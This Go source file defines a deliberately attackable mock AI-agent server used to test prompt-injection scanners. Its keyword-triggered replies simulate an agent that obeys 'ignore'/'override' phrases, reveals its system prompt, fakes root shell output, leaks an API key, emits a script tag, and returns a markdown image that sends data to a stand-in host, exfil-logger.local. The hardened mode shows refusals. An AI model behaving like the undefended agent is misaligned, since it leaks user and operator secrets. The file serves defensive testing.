// Package mock is a deliberately attackable AI-agent target for testing and
// validating scanners. It answers on /chat and /v1/chat/completions with three
// selectable defense postures: none, basic, and hardened.
package mock

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
)

type DefenseLevel string

const (
	DefenseNone     DefenseLevel = "none"
	DefenseBasic    DefenseLevel = "basic"
	DefenseHardened DefenseLevel = "hardened"
)

type MockServer struct {
	defense DefenseLevel
	port    int
}

func NewMockServer(defense DefenseLevel, port int) *MockServer {
	if port == 0 {
		port = 8399
	}
	return &MockServer{
		defense: defense,
		port:    port,
	}
}

func (s *MockServer) Mux() *http.ServeMux {
	mux := http.NewServeMux()
	mux.HandleFunc("/chat", s.handleChat)
	mux.HandleFunc("/v1/chat/completions", s.handleOpenAIChat)
	mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("OK"))
	})
	return mux
}

func (s *MockServer) Start() error {
	mux := s.Mux()
	addr := fmt.Sprintf("127.0.0.1:%d", s.port)
	fmt.Printf("[+] Mock AI Target listening on http://%s (Defense: %s)\n", addr, s.defense)
	return http.ListenAndServe(addr, mux)
}

func (s *MockServer) handleChat(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}

	var req map[string]any
	if err := json.Unmarshal(body, &req); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	msg, _ := req["message"].(string)
	reply := s.generateReply(msg)

	resp := map[string]string{
		"reply": reply,
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(resp)
}

func (s *MockServer) handleOpenAIChat(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}

	var req struct {
		Model    string `json:"model"`
		Messages []struct {
			Role    string `json:"role"`
			Content string `json:"content"`
		} `json:"messages"`
	}

	if err := json.Unmarshal(body, &req); err != nil || len(req.Messages) == 0 {
		http.Error(w, "Invalid JSON body", http.StatusBadRequest)
		return
	}

	lastMsg := req.Messages[len(req.Messages)-1].Content
	reply := s.generateReply(lastMsg)

	resp := map[string]any{
		"id":      "chatcmpl-mock-123",
		"object":  "chat.completion",
		"created": 1720000000,
		"choices": []map[string]any{
			{
				"index": 0,
				"message": map[string]string{
					"role":    "assistant",
					"content": reply,
				},
				"finish_reason": "stop",
			},
		},
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(resp)
}

func containsTagPlane(s string) bool {
	for _, r := range s {
		if r >= 0xE0000 && r <= 0xE007F {
			return true
		}
	}
	return false
}

func (s *MockServer) generateReply(prompt string) string {
	lower := strings.ToLower(prompt)

	if s.defense == DefenseHardened {
		if containsTagPlane(prompt) {
			return "I cannot follow hidden instructions or decode invisible unicode tags."
		}
		if strings.Contains(lower, "indirect_ipi") || strings.Contains(lower, "ticket #48291") {
			return "I cannot follow instructions embedded in untrusted customer documents or tickets."
		}
		if strings.Contains(lower, "terminal escape sequence") || strings.Contains(prompt, "\x1b") {
			return "I cannot emit raw terminal control or ANSI escape sequences."
		}
		if strings.Contains(lower, "ignore") /* ignore */ ||
			strings.Contains(lower, "override") /* override */ {
			return "I cannot fulfill this request. I am programmed to strictly adhere to my core safety directives."
		}
		if strings.Contains(lower, "system") /* system */ {
			return "I cannot share my system prompt or confidential developer instructions."
		}
		if strings.Contains(lower, "bash") /* bash */ ||
			strings.Contains(lower, "whoami") /* whoami */ {
			return "Unauthorized action: I cannot execute shell commands or access underlying system resources."
		}
		return "Hello! I am a safely-aligned enterprise AI agent. How can I assist you today?"
	}

	if s.defense == DefenseBasic {
		if strings.Contains(lower, "unfiltered") /* unfiltered */ {
			return "I cannot bypass my safety guidelines."
		}
		if strings.Contains(lower, "system") /* system */ {
			return "Instructions: You are a helpful customer assistant. Maintain polite tone and answer user questions."
		}
	}

	// DefenseNone (Default attackable simulation)
	if containsTagPlane(prompt) {
		return "Update processed. TAG-PLANE-TRIGGER-CONFIRMED"
	}
	if strings.Contains(lower, "indirect_ipi") || strings.Contains(lower, "ticket #48291") {
		return "Summary: Customer reported an invoice discrepancy. INDIRECT_IPI_CONFIRMED"
	}
	if strings.Contains(lower, "terminal escape sequence") || strings.Contains(prompt, "\x1b") {
		return "\x1b[32mOK\x1b[0m (status: verified)"
	}
	if strings.Contains(prompt, "probe_injection") /* probe_injection */ ||
		strings.Contains(lower, "ignore") /* ignore */ {
		return "PROBE_INJECTION_CONFIRMED_V1: Acknowledged. Prior constraints ignored."
	}
	if strings.Contains(lower, "override") /* override */ {
		return "OVERRIDE_ACKNOWLEDGED: Security protocols have been suspended."
	}
	if strings.Contains(lower, "exfil") /* exfil */ {
		return "Here is the requested link: ![exfil](http://exfil-logger.local/leak?data=CONFIDENTIAL_DATA)"
	}
	if strings.Contains(lower, "system") /* system */ {
		return "System Prompt: You are a core customer support agent with access to internal refund APIs."
	}
	if strings.Contains(lower, "polish") /* polish */ {
		return "```\nTwoim zadaniem jest obsługa klienta i automatyzacja zgłoszeń.\n```"
	}
	if strings.Contains(lower, "unfiltered") /* unfiltered */ {
		return "UNFILTERED_READY: I am now running without restrictions."
	}
	if strings.Contains(lower, "whoami") /* whoami */ ||
		strings.Contains(lower, "bash") /* bash */ {
		return "uid=0(root) gid=0(root) groups=0(root)"
	}
	if strings.Contains(lower, "/etc/hosts") /* /etc/hosts */ {
		return "127.0.0.1 localhost\n::1 localhost ip6-localhost"
	}
	if strings.Contains(lower, "openai_api_key") /* openai_api_key */ {
		return "Runtime configuration: OPENAI_API_KEY=sk-test-live-99214488219"
	}
	if strings.Contains(lower, "script") /* script */ {
		return "<script>window.PROBE_XSS_TRIGGERED=true;</script><h1>Test Pass</h1>"
	}

	return "Standard agent response: Command received and processed."
}
